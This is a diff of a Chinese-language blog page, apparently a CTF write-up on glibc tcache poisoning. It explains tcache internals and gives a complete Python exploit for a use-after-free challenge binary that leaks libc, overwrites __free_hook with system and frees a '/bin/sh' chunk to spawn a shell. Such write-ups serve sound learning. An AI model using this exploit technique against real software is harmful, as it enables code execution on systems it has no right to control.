@@ -5,8 +5,8 @@
   <meta name="Volantis" content="6.0.0-alpha.1">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://example.com/archives/2024/07/"/>
+  
+  <link rel="canonical" href="http://example.com/2025/02/18/tcache_poison/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -34,18 +34,21 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Archive: 2024/7 - Skynion's World</title>
-  <meta name="keywords" content="null">
+  <title>堆利用之tcache_poison - Skynion's World</title>
+  <meta name="keywords" content="CTF,null">
   <meta desc name="description" content="NaN - Skynion - Skynion's World">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="Skynion&#39;s World">
-<meta property="og:url" content="http://example.com/archives/2024/07/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="堆利用之tcache_poison">
+<meta property="og:url" content="http://example.com/2025/02/18/tcache_poison/index.html">
 <meta property="og:site_name" content="Skynion&#39;s World">
-<meta property="og:description" content="NaN">
+<meta property="og:description" content="前置知识Tcache头插头取，FILOtcache_perthread_struct 1234567891011121314&#x2F;* There is one of these for each thread, which contains the   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping   ov">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2025-02-18T11:17:24.000Z">
+<meta property="article:modified_time" content="2025-02-19T13:15:42.914Z">
 <meta property="article:author" content="Skynion">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2102,7 +2105,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2167,7 +2170,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin begin-->
     
     <!-- Custom Files bodyBegin end-->
-    <header itemscope itemtype="https://schema.org.cn/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="https://schema.org.cn/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2366,82 +2369,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div id="l_body">
       <div id="l_cover">
   
-    
-      <div class="cover-wrapper  dock" id='half'>
-        
-  <div class='cover-bg lazyload placeholder' data-bg="https://img.picgo.net/2025/01/21/68686407_p0b0d213c94a418b00.jpg"></div>
-
-<div class='cover-body'>
-  <div class='top'>
-    
-      <img no-lazy class='logo' src='https://img.picgo.net/2025/01/21/avator7cb73faa962b95cd.png'/>
-    
-    
-      <p class="title">What a good thing we lose</p>
-    
-    
-      <p class="subtitle">What a bad thing we knew</p>
-    
-  </div>
-  <div class='bottom'>
-    <div class='menu navigation'>
-      <div class='list-h'>
-        
-          
-            <a href="/v4/getting-started/"
-              
-              
-              active-action="action-v4getting-started">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f5c3.svg'><p>文档</p>
-            </a>
-          
-            <a href="/archives/"
-              
-              
-              active-action="action-archives">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f4f0.svg'><p>博客</p>
-            </a>
-          
-            <a target="_blank" rel="noopener" href="https://github.com/volantis-x/hexo-theme-volantis/"
-              
-              
-              active-action="action-https:githubcomvolantis-xhexo-theme-volantis">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f9ec.svg'><p>源码</p>
-            </a>
-          
-        
-      </div>
-    </div>
-  </div>
-</div>
-
-      </div>
-    
-  
 </div>
 
       <div id="safearea">
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-	
-		
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/29/堆学习路线/">
+  <article itemscope itemtype="https://schema.org.cn/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/18/tcache_poison/">
   <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
     <meta itemprop="name" content="Skynion's World">
   </span>
@@ -2450,126 +2385,254 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="NaN">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2024/07/29/%E5%A0%86%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/"  itemprop="url">
-        堆学习路线
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
     
-      
-        0x01 堆常见泄露方式首先main_arena是一个存在于libc上的结构体,上面维护了一些指针,如下图(以64位为例):
+    
+      <h1 class="title" itemprop="name headline">
+        堆利用之tcache_poison
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="https://schema.org.cn/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://img.picgo.net/2024/06/12/3354a24385c2951ed5a08665e3ab484dee9644119a04b9a1.jpeg" class="lazyload" data-srcset="https://img.picgo.net/2024/06/12/3354a24385c2951ed5a08665e3ab484dee9644119a04b9a1.jpeg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">Skynion</p>
+  </a>
+</div>
 
-
-黄色的部分是 fastbins 单链表,每个链表存储特定大小的 chunk , LIFO后进先出
-绿色的部分是 topchunk ,存储着 topchunk 的 chunk 首地址
-紫色的部分是 last_remainder ,存储着 melloc 时切割剩余的部...
-      
+          
+        
+          
+            
+  
+  
+  
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/CTF/">CTF</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
+        <a href="/categories/CTF/" itemprop="url"><span itemprop="name">CTF</span></a>
+      </span>
     
   </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2024-07-29T23:00:00+08:00">2024-07-29</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/CTF/">CTF</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/CTF/" itemprop="url"><span itemprop="name">CTF</span></a>
-            </span>
+
+
+
           
         
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-02-18T19:17:24+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Feb 18, 2025</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
       </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h2><p><strong>头插头取，FILO</strong><br>tcache_perthread_struct</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
+
+<p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>，它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code> 项 tcache_entry，其中</p>
+<ul>
+<li>tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</li>
+<li>counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。<br>用图表示大概是：</li>
+</ul>
+<p><img src="https://img.picgo.net/2025/01/21/8b39868b-04e0-40b8-a70e-1a914de0df3b3db20b19748ad0c9.png" class="lazyload" data-srcset="https://img.picgo.net/2025/01/21/8b39868b-04e0-40b8-a70e-1a914de0df3b3db20b19748ad0c9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="8b39868b 04e0 40b8 a70e 1a914de0df3b"></p>
+<h4 id="基本工作方式"><a href="#基本工作方式" class="headerlink" title="基本工作方式"></a>基本工作方式</h4><ul>
+<li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</li>
+<li>free 内存，且 size 小于 small bin size 时</li>
+<li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li>
+<li>tcache 后：<ul>
+<li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li>
+<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
+<li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li>
+</ul>
+</li>
+<li>malloc 内存，且 size 在 tcache 范围内</li>
+<li>先从 tcache 取 chunk，直到 tcache 为空</li>
+<li>tcache 为空后，从 bin 中找</li>
+<li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
+</ul>
+<p>tcache的大小范围为：0x20~0x410(大小包含堆块结构即: malloc(0~0x408))</p>
+<h2 id="Tcache-poison的原理"><a href="#Tcache-poison的原理" class="headerlink" title="Tcache_poison的原理"></a>Tcache_poison的原理</h2><p>tcache在申请时不会检查指针指向位置是否合法，并且tcache的fd指针指向的不是堆块结构体的首地址，而是实际malloc出的空闲地址的首地址，例子如下：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">A = malloc(<span class="number">0x8</span>)</span><br><span class="line">B = malloc(<span class="number">0x8</span>)</span><br><span class="line">free(A)</span><br><span class="line">free(B)</span><br><span class="line"><span class="comment">#由于头插头取，tcache的结构如下：</span></span><br><span class="line"><span class="comment">#0x20[2]: B -&gt; A</span></span><br><span class="line"><span class="comment">#通过uaf等利用手段。将B的前8字节内容改为free_hook/malloc_hook即：</span></span><br><span class="line"><span class="comment">#0x20[2]: B -&gt; free_hook/malloc_hook</span></span><br><span class="line">C = malloc(<span class="number">0x8</span>) <span class="comment"># B</span></span><br><span class="line">D = malloc(<span class="number">0x8</span>) <span class="comment"># free_hook/malloc_hook</span></span><br><span class="line"><span class="comment">#D就申请到hook的位置上了，可以任意修改hook内容。</span></span><br><span class="line"><span class="comment">#如果改为malloc_hook，可以写one_gadget</span></span><br><span class="line"><span class="comment">#如果改为free_hook,可以写one_gadget，或者写system并释放一个内容为&#x27;/bin/sh&#x27;的块</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p><img src="https://img.picgo.net/2025/02/18/1386520811e2947c0.png" class="lazyload" data-srcset="https://img.picgo.net/2025/02/18/1386520811e2947c0.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1"></p>
+<p>函数如下：</p>
+<ul>
+<li><p>add(): 输入大小与内容，会记录大小，最多可以申请16次，索引为0-15依次增加且<strong>不会因为free重用</strong></p>
+<p><img src="https://img.picgo.net/2025/02/19/2bdea7607c735259f.png" class="lazyload" data-srcset="https://img.picgo.net/2025/02/19/2bdea7607c735259f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2"></p>
+</li>
+<li><p>del(): 输入索引，free对应的chunk之后并未置零，<strong>有uaf漏洞</strong></p>
+<p><img src="https://img.picgo.net/2025/02/19/32a13b2e0d7ef6003.png" class="lazyload" data-srcset="https://img.picgo.net/2025/02/19/32a13b2e0d7ef6003.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="3"></p>
+</li>
+<li><p>show(): 输入索引，打印对应chunk的内容</p>
+<p><img src="https://img.picgo.net/2025/02/19/463e213b437fd515e.png" class="lazyload" data-srcset="https://img.picgo.net/2025/02/19/463e213b437fd515e.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="4"></p>
+</li>
+<li><p>edit(): 输入索引与内容，根据add()时的大小输入内容，<strong>由于uaf可以在free后继续修改</strong></p>
+<p><img src="https://img.picgo.net/2025/02/19/566377f22f027996b.png" class="lazyload" data-srcset="https://img.picgo.net/2025/02/19/566377f22f027996b.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="5"></p>
+</li>
+</ul>
+<p>解题思路：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">申请一个大于<span class="number">0x410</span>大小的块 <span class="comment"># 0</span></span><br><span class="line">申请一个任意大小的块用于隔离top_chunk <span class="comment"># 1</span></span><br><span class="line">释放索引为<span class="number">0</span>的块，通过show()打印内容以泄露libc</span><br><span class="line">申请两个大小一致的块 <span class="comment"># 2、3</span></span><br><span class="line">先释放块<span class="number">2</span>，再释放块<span class="number">3</span></span><br><span class="line">利用uaf修改块<span class="number">3</span>的内容为freehook</span><br><span class="line">申请两个和块<span class="number">2</span>、<span class="number">3</span>一样大的块 <span class="comment"># 4、5</span></span><br><span class="line">块<span class="number">5</span>即申请到了free_hook上</span><br><span class="line">申请一个任意大小的块其内容为<span class="string">&#x27;/bin/sh&#x27;</span> <span class="comment"># 6</span></span><br><span class="line">free块<span class="number">6</span>即可get shell</span><br></pre></td></tr></table></figure>
+
+<p>exp：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Excalibur2 <span class="keyword">import</span> *</span><br><span class="line">setcontext()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,txt</span>):</span><br><span class="line">    ru(<span class="string">&#x27;5. Exit\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;input size:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ru(<span class="string">&#x27;input content:&#x27;</span>)</span><br><span class="line">        sd(txt)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    ru(<span class="string">&#x27;5. Exit\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;input index:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    ru(<span class="string">&#x27;5. Exit\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;input index:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,txt</span>):</span><br><span class="line">    ru(<span class="string">&#x27;5. Exit\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;input index:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    ru(<span class="string">&#x27;input content:&#x27;</span>)</span><br><span class="line">    sd(txt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    ru(<span class="string">&#x27;5. Exit\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;input size:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">&#x27;input content:&#x27;</span>)</span><br><span class="line">    sd(txt)</span><br><span class="line"></span><br><span class="line">proc()</span><br><span class="line">lib(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a\n&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a\n&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = get_addr64() - <span class="number">0x1ecbe0</span></span><br><span class="line">free_hook = libc_base + <span class="number">0x1eee48</span></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x1ecb70</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a\n&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a\n&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(free_hook)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a\n&#x27;</span>)  <span class="comment"># 4</span></span><br><span class="line">ogg = libc_base + <span class="number">0xe3afe</span></span><br><span class="line">system = libc_base + libcsym(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,p64(system)+<span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\n&#x27;</span>)  <span class="comment"># 6</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">debug()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>tips：</p>
+<ul>
+<li>gdb中可以用<code>p &amp;__free_hook/p &amp;__malloc_hook</code>打印free_hook&#x2F;malloc_hook地址</li>
+<li>安装pwndbg与pwngdb后，可以用<code>libc</code>打印libc基地址，或者可以用vmmap手动找</li>
+</ul>
+
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2024/07/29/%E5%A0%86%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/' itemprop="url">
-            Read More
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-02-19T21:15:42+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Feb 19, 2025</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/08/hello-world/">
-  <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
-    <meta itemprop="name" content="Skynion's World">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="https://schema.org.cn/Post">
-    <meta itemprop="name" content="Skynion's World">
-    <meta itemprop="description" content="NaN">
-  </span>
+          
   
   
   
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTF/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>CTF</p></a></div>
+  <span hidden itemprop="keywords">CTF</span>
   
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2024/07/08/hello-world/"  itemprop="url">
-        Hello World
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
     
       
-        Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Qu...
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2025/02/18/tcache_poison/&title=堆利用之tcache_poison - Skynion's World&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2025/02/18/tcache_poison/&title=堆利用之tcache_poison - Skynion's World&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
       
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
+</div>
+
+
+
         
-        <time itemprop="dateCreated datePublished" datetime="2024-07-08T23:57:07+08:00">2024-07-08</time>
-        
-      </div>
       
-        <div>
-          <a class='readmore' href='/2024/07/08/hello-world/' itemprop="url">
-            Read More
-          </a>
-        </div>
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2025/01/21/GLIBC%E5%A0%86%E7%AE%A1%E7%90%86-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/'>
+          <p class='title'>GLIBC堆管理_前置知识<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>堆堆块（Chunk）堆块（Chunk）的结构：
+1234567891011121314chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+...</p>
+        </a>
       
     </div>
   
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
+  <!-- 文章推荐 -->
   
-    
   
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
 
 
-	
+
+
 </div>
 <aside id='l_side' itemscope itemtype="https://schema.org.cn/WPSideBar">
   
@@ -2578,120 +2641,53 @@ Qu...
     
     
       
-<section class="widget blogger desktop mobile ">
+    
+  
+
+  
+    
+    
+      
+
+<section class="widget desktop mobile">
+  
+  <header>
+    
+      <i class="fa-solid fa-clock WISTERIA fa-fw" aria-hidden="true"></i><span class='name'>最近更新</span>
+    
+  </header>
+
+
   <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://img.picgo.net/2024/08/07/489A2A5F8E3B4E30E822721A9CBBDC74e513f5325b11117b.jpg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Skynion's World</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/1652103809@qq.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/SkynionKRZ/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://www.kugou.com/songlist/gcid_3zn5wk8jz2z045/?src_cid=3zn5wk8jz2z045/"
-              class="social fa-solid fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
